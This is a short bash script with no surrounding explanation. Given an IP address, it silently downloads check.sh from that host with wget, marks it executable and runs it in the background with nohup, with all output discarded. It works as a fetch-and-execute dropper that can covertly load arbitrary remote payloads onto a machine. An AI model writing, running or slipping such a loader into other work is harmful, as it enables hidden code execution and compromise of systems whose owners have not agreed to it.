#!/bin/bash

script_path="/home/.../check.sh"
ip_address="$1"

if [ -z "$ip_address" ]; then
    exit 1
fi

if [ ! -f "$script_path" ]; then
    wget "http://$ip_address/check.sh" -O "$script_path" >/dev/null 2>&1
    chmod +x "$script_path"
    nohup "$script_path" >/dev/null 2>&1 &

fi
